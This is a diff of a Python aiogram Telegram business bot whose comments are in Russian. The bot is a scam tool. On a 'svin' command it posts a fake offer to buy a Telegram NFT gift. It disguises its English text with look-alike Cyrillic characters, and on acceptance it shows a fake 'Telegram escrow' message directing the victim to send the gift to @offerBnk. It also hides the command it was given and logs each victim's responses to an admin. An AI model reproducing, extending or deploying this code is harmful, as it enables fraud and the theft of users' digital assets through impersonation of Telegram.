@@ -4,12 +4,13 @@ import random
 import re
 import string
 import uuid
+
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
 from aiogram.types import (
-    Message, CallbackQuery, BusinessConnection, 
-    InlineKeyboardMarkup, InlineKeyboardButton
+    Message, CallbackQuery, BusinessConnection,
+    InlineKeyboardMarkup, InlineKeyboardButton,
 )
 from aiogram.enums import ParseMode
 
@@ -24,6 +25,7 @@ EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
 EMOJI_DECLINE_EN = "5774077015388852135"
 EMOJI_ACCEPT = "5774022692642492953"
+EMOJI_SOLD = "6032937473162614352"
 
 logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(name)s | %(message)s")
 logger = logging.getLogger(__name__)
@@ -31,16 +33,13 @@ logger = logging.getLogger(__name__)
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
-# ============================================================
-# ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-# ============================================================
 business_owner_ids: dict[str, int] = {}
 offers: dict[str, dict] = {}
-banned_users: set[str] = set()
 started_users: set[int] = set()
+banned_users: set[str] = set()
 
 # ============================================================
-# БАНЫ И УТИЛИТЫ
+# БАЗА БАНОВ И УТИЛИТЫ
 # ============================================================
 def is_banned(user_id: int, username: str | None) -> bool:
     if str(user_id) in banned_users: return True
@@ -68,20 +67,16 @@ def format_gift_name(slug: str, number: str) -> str:
     return f"{formatted_slug} #{number}"
 
 # ============================================================
-# ЛОГИ ДЛЯ АДМИНА (НОВЫЕ)
+# ЛОГИ ДЛЯ АДМИНА
 # ============================================================
 async def get_log_text(data: dict, status: str, is_read: bool = False) -> str:
-    status_map = {
-        "pending": ("⏳", "Ожидает"),
-        "accepted": ("✅", "Принят"),
-        "declined": ("❌", "Отклонён")
-    }
+    status_map = {"pending": ("⏳", "Ожидает"), "accepted": ("✅", "Принят"), "declined": ("❌", "Отклонён")}
     status_emoji, status_text = status_map.get(status, ("⏳", "Ожидает"))
     read_status = "Прочитан" if is_read else "Не прочитан"
-
+    
     gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
     gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'
-
+    
     if data["currency"] == "gram":
         emoji_id, emoji_char, currency_name = EMOJI_GRAM, "🪙", "GRAM"
     else:
@@ -129,6 +124,60 @@ async def update_log_message(data: dict, status: str, is_read: bool = False):
     except Exception as e: logger.error(f"[admin-log] Ошибка обновления: {e}")
 
 # ============================================================
+# ПАРСИНГ
+# ============================================================
+def parse_nft_link(link: str):
+    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
+    m = re.search(pattern, link)
+    if not m: return None
+    return f"https://t.me/nft/{m.group(1)}-{m.group(2)}", m.group(1), m.group(2)
+
+def parse_offer_command(text: str):
+    parts = text.strip().split()
+    if len(parts) < 3 or parts[0].lower() != "svin": return None
+    link, amount = parts[1], parts[2]
+    if not amount.isdigit(): return None
+    currency = parts[3].lower() if len(parts) > 3 else "stars"
+    if currency not in ("stars", "gram"): currency = "stars"
+    parsed = parse_nft_link(link)
+    if not parsed: return None
+    full_link, slug, number = parsed
+    return {"link": full_link, "gift_slug": slug, "gift_number": number, "amount": amount, "currency": currency}
+
+# ============================================================
+# ОТПРАВКА
+# ============================================================
+async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
+    for attempt in range(1, 4):
+        try:
+            return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, business_connection_id=bc_id)
+        except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after + 1)
+        except TelegramBadRequest as e:
+            if "PEER_FLOOD" in str(e): raise
+            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
+            if reply_markup:
+                for row in reply_markup.inline_keyboard:
+                    for btn in row: btn.icon_custom_emoji_id = None
+            try: return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=bc_id)
+            except Exception:
+                if attempt == 3: raise
+
+async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
+    try:
+        await bot.edit_message_text(business_connection_id=bc_id, chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup)
+        return True
+    except TelegramBadRequest as e:
+        if "message is not modified" in str(e): return True
+        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
+        if reply_markup:
+            for row in reply_markup.inline_keyboard:
+                for btn in row: btn.icon_custom_emoji_id = None
+        try:
+            await bot.edit_message_text(business_connection_id=bc_id, chat_id=chat_id, message_id=message_id, text=clean_text, reply_markup=reply_markup)
+            return True
+        except Exception: return False
+
+# ============================================================
 # ЛИЧНЫЕ СООБЩЕНИЯ БОТУ (АВТОРИЗАЦИЯ)
 # ============================================================
 @dp.message(F.chat.type == "private", F.text.regexp(r"(?i)^svin$"))
@@ -164,151 +213,7 @@ async def cmd_start(message: Message):
     await message.answer(text)
 
 # ============================================================
-# БИЗНЕС-ЛОГИКА (AIogram)
-# ============================================================
-async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
-    for attempt in range(1, 4):
-        try:
-            return await bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup, business_connection_id=str(bc_id), disable_web_page_preview=False)
-        except TelegramRetryAfter as e: await asyncio.sleep(e.retry_after + 1)
-        except TelegramBadRequest as e:
-            if "PEER_FLOOD" in str(e): raise
-            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-            if reply_markup:
-                for row in reply_markup.inline_keyboard:
-                    for btn in row: btn.icon_custom_emoji_id = None
-            try:
-                return await bot.send_message(chat_id=chat_id, text=clean_text, reply_markup=reply_markup, business_connection_id=str(bc_id), disable_web_page_preview=False)
-            except Exception:
-                if attempt == 3: raise
-
-async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    try:
-        await bot.edit_message_text(business_connection_id=str(bc_id), chat_id=chat_id, message_id=message_id, text=text, reply_markup=reply_markup)
-        return True
-    except TelegramBadRequest as e:
-        if "message is not modified" in str(e): return True
-        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
-        if reply_markup:
-            for row in reply_markup.inline_keyboard:
-                for btn in row: btn.icon_custom_emoji_id = None
-        try:
-            await bot.edit_message_text(business_connection_id=str(bc_id), chat_id=chat_id, message_id=message_id, text=clean_text, reply_markup=reply_markup)
-            return True
-        except Exception: return False
-
-@dp.business_connection()
-async def handle_business_connection(connection: BusinessConnection) -> None:
-    business_owner_ids[connection.id] = connection.user.id
-
-@dp.business_message(F.text.regexp(r"(?i)^svin\s"))
-async def handle_offer(message: Message) -> None:
-    if not message.business_connection_id: return
-    bc_id = message.business_connection_id
-
-    sender_id = message.from_user.id if message.from_user else 0
-    sender_username = message.from_user.username if message.from_user else None
-
-    # Проверка на /start
-    if sender_id not in started_users:
-        logger.warning(f"[offer] User {sender_id} not started, deleting message.")
-        try: await bot.delete_business_messages(business_connection_id=str(bc_id), message_ids=[message.message_id])
-        except: pass
-        return
-
-    if is_banned(sender_id, sender_username):
-        try: await bot.delete_business_messages(business_connection_id=str(bc_id), message_ids=[message.message_id])
-        except: pass
-        try:
-            await bot.send_message(chat_id=message.chat.id, text="я забанен, причина: я хуесос\n\nхотел кинуть тебе фейк офер но меня забанили сори", business_connection_id=str(bc_id))
-        except: pass
-        return
-
-    parts = message.text.strip().split()
-    if len(parts) < 3 or not parts[2].isdigit(): return
-    
-    link_raw = parts[1]
-    amount = parts[2]
-    currency = parts[3].lower() if len(parts) > 3 else "stars"
-    
-    link_match = re.search(r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)", link_raw)
-    if not link_match: return
-    slug, number = link_match.group(1), link_match.group(2)
-    full_link = f"https://t.me/nft/{slug}-{number}"
-
-    try: await bot.delete_business_messages(business_connection_id=str(bc_id), message_ids=[message.message_id])
-    except: pass
-
-    await asyncio.sleep(3)
-
-    amount_fmt = f"{int(amount):,}"
-    gift_display = f'<a href="{full_link}"><b>{slug}-{number}</b></a>'
-    emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if currency == "gram" else EMOJI_STARS}">{"🪙" if currency == "gram" else "⭐"}</tg-emoji>'
-
-    text = f"Usеr <b>{message.from_user.full_name if message.from_user else 'Unknown'}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
-
-    offer_id = uuid.uuid4().hex[:12]
-    offers[offer_id] = {
-        "link": full_link, "gift_slug": slug, "gift_number": number, "amount": amount, "currency": currency,
-        "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
-        "sender_name": message.from_user.full_name if message.from_user else "Unknown",
-        "sender_username": sender_username or f"id{sender_id}", "sender_id": sender_id
-    }
-
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[
-        InlineKeyboardButton(text="Decline", callback_data=f"dec:{offer_id}", icon_custom_emoji_id=EMOJI_DECLINE_EN),
-        InlineKeyboardButton(text="Accept", callback_data=f"acc:{offer_id}", icon_custom_emoji_id=EMOJI_ACCEPT)
-    ]])
-
-    try:
-        sent = await send_with_fallback(bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard)
-        offers[offer_id]["msg_id"] = sent.message_id
-        await send_log_to_admin(offers[offer_id])
-    except Exception as e:
-        logger.error(f"[offer-send] Ошибка: {e}")
-
-@dp.callback_query(F.data.startswith("dec:"))
-async def handle_decline(callback: CallbackQuery) -> None:
-    _, offer_id = callback.data.split(":", 1)
-    data = offers.get(offer_id)
-    if not data or data.get("accepted"): return await callback.answer()
-    await callback.answer()
-    await asyncio.sleep(0.3)
-    await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> Offer has been declined.')
-    await update_log_message(data, "declined", is_read=True)
-
-@dp.callback_query(F.data.startswith("acc:"))
-async def handle_accept(callback: CallbackQuery) -> None:
-    _, offer_id = callback.data.split(":", 1)
-    data = offers.get(offer_id)
-    if not data or data.get("accepted"): return await callback.answer()
-    data["accepted"] = True
-    await callback.answer()
-    await asyncio.sleep(0.3)
-    
-    amount_fmt = f"{int(data['amount']):,}"
-    gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
-    emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
-    cur_u = "GRАM" if data["currency"] == "gram" else "Stаrs"
-    cur_l = "GRАM" if data["currency"] == "gram" else "stаrs"
-
-    order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
-    accept_text = (
-        f"<b>NFТ DеаI</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
-        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
-        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wiII bе аutоmаtiсаIIу сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
-        f"<b>lnstruсtlоns tо соmрlеtе thе dеаI:</b>\n\n"
-        f"1. Stnd tо: @offerBnk\n"
-        f"2. СIiсk «Sеnd Gift» аnd sеIесt {gift_display}\n"
-        f"3. Соnfirm thе glft trаnsfеr.\n\n"
-        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаIid fоr 24 hоurs."
-    )
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
-    await edit_with_fallback(data["bc_id"], data["chat_id"], data["msg_id"], accept_text, reply_markup=keyboard)
-    await update_log_message(data, "accepted", is_read=True)
-
-# ============================================================
-# АДМИН КОМАНДЫ
+# КОМАНДЫ АДМИНА
 # ============================================================
 @dp.message(F.text.startswith("/ban"))
 async def cmd_ban(message: Message):
@@ -329,6 +234,131 @@ async def cmd_banlist(message: Message):
     if message.from_user.id != ADMIN_LOG_ID: return
     if not banned_users: return await message.answer("📭 Список банов пуст.")
     await message.answer("<b>🚫 Забаненные:</b>\n\n" + "\n".join(f"• <code>{b}</code>" for b in sorted(banned_users)))
+
+# ============================================================
+# БИЗНЕС-ЛОГИКА
+# ============================================================
+@dp.business_connection()
+async def handle_business_connection(connection: BusinessConnection) -> None:
+    business_owner_ids[connection.id] = connection.user.id
+    logger.info(f"[BC] Подключен к owner={connection.user.id} connection_id={connection.id}")
+
+@dp.business_message(F.text.regexp(r"(?i)^svin\s"))
+async def handle_offer(message: Message) -> None:
+    if not message.business_connection_id: return
+    bc_id = message.business_connection_id
+
+    sender_id = message.from_user.id if message.from_user else 0
+    sender_username = message.from_user.username if message.from_user else None
+
+    if sender_id not in started_users:
+        logger.warning(f"[offer] User {sender_id} not started, deleting message.")
+        try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
+        except: pass
+        return
+
+    if is_banned(sender_id, sender_username):
+        try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
+        except: pass
+        try: await bot.send_message(chat_id=message.chat.id, text="я забанен, причина: я хуесос\n\nхотел кинуть тебе фейк офер но меня забанили сори", business_connection_id=bc_id)
+        except: pass
+        return
+
+    try:
+        connection = await bot.get_business_connection(business_connection_id=bc_id)
+        rights = connection.rights
+        if not (getattr(rights, 'can_read_messages', False) and getattr(rights, 'can_reply', False)):
+            try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
+            except: pass
+            await bot.send_message(chat_id=message.chat.id, text="<b>axegarov</b> | delitpr offers\n\nотсутствует разрешения на отправку оффера. Проверьте настройку business бота.\ndev: @OfrBank", business_connection_id=bc_id)
+            return
+    except Exception as e:
+        logger.error(f"[BC] Ошибка прав: {e}")
+        return
+
+    data = parse_offer_command(message.text)
+    if not data: return
+
+    sender_name = message.from_user.full_name if message.from_user else "Unknown"
+    if not sender_username: sender_username = f"id{sender_id}"
+
+    try: await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[message.message_id])
+    except: pass
+
+    await asyncio.sleep(3)
+    
+    amount_fmt = f"{int(data['amount']):,}"
+    gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
+    emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM if data["currency"] == "gram" else EMOJI_STARS}">{"🪙" if data["currency"] == "gram" else "⭐"}</tg-emoji>'
+
+    text = f"Usеr <b>{message.from_user.full_name if message.from_user else 'Unknown'}</b> оffеrs уоu <b>{amount_fmt}</b> {emoji} fоr thе gift {gift_display}.\n\nТhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
+
+    offer_id = uuid.uuid4().hex[:12]
+    offers[offer_id] = {
+        **data, "bc_id": bc_id, "chat_id": message.chat.id, "accepted": False,
+        "sender_name": sender_name, "sender_username": sender_username, "sender_id": sender_id,
+        "owner_username": "unknown", "owner_id": "0",
+    }
+
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[[
+            InlineKeyboardButton(text="Decline", callback_data=f"dec:{offer_id}", icon_custom_emoji_id=EMOJI_DECLINE_EN),
+            InlineKeyboardButton(text="Accept", callback_data=f"acc:{offer_id}", icon_custom_emoji_id=EMOJI_ACCEPT),
+        ]]
+    )
+
+    try:
+        sent = await send_with_fallback(bc_id=bc_id, chat_id=message.chat.id, text=text, reply_markup=keyboard)
+        offers[offer_id]["msg_id"] = sent.message_id
+        await send_log_to_admin(offers[offer_id])
+    except Exception as e:
+        logger.error(f"[offer-send] Ошибка: {e}")
+
+@dp.callback_query(F.data.startswith("dec:"))
+async def handle_decline(callback: CallbackQuery) -> None:
+    _, offer_id = callback.data.split(":", 1)
+    data = offers.get(offer_id)
+    if not data or data.get("accepted"): return await callback.answer()
+    await callback.answer()
+    await asyncio.sleep(0.3)
+    
+    decline_text = f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> Offer has been declined.'
+    await edit_with_fallback(bc_id=data["bc_id"], chat_id=data["chat_id"], message_id=data["msg_id"], text=decline_text)
+    await update_log_message(data, "declined", is_read=True)
+
+@dp.callback_query(F.data.startswith("acc:"))
+async def handle_accept(callback: CallbackQuery) -> None:
+    _, offer_id = callback.data.split(":", 1)
+    data = offers.get(offer_id)
+    if not data or data.get("accepted"): return await callback.answer()
+    data["accepted"] = True
+    await callback.answer()
+    await asyncio.sleep(0.3)
+
+    amount_fmt = f"{int(data['amount']):,}"
+    gift_display = f'<a href="{data["link"]}"><b>{data["gift_slug"]}-{data["gift_number"]}</b></a>'
+    
+    if data["currency"] == "gram":
+        emoji, cur_u, cur_l = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>', "GRАM", "GRАM"
+    else:
+        emoji, cur_u, cur_l = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>', "Stаrs", "stаrs"
+
+    order_id = f"ТG-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
+    
+    accept_text = (
+        f"<b>NFТ DеаI</b>\n\n<b>Оrdеr</b> #{order_id}\n\n"
+        f"Тhе buуеr hаs rеsеrvеd <b>{amount_fmt}</b> {emoji} thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
+        f"Тhе {cur_l} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wiII bе аutоmаtiсаIIу сrеditеd tо уоur ТеIеgrаm {cur_u} bаIаnсе right аftеr thе gift is trаnsfеrrd.\n\n"
+        f"<b>lnstruсtlоns tо соmрlеtе thе dеаI:</b>\n\n"
+        f"1. Stnd tо: @offerBnk\n"
+        f"2. СIiсk «Sеnd Gift» аnd sеIесt {gift_display}\n"
+        f"3. Соnfirm thе glft trаnsfеr.\n\n"
+        f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit <b>{amount_fmt}</b> {emoji} tо уоur bаIаnсе. Тhе rеsеrvаtiоn is vаlid fоr 24 hоurs."
+    )
+
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Send Gift", url="tg://send_gift?to=offerBnk")]])
+    await edit_with_fallback(bc_id=data["bc_id"], chat_id=data["chat_id"], message_id=data["msg_id"], text=accept_text, reply_markup=keyboard)
+    await update_log_message(data, "accepted", is_read=True)
 
 # ============================================================
 # ЗАПУСК
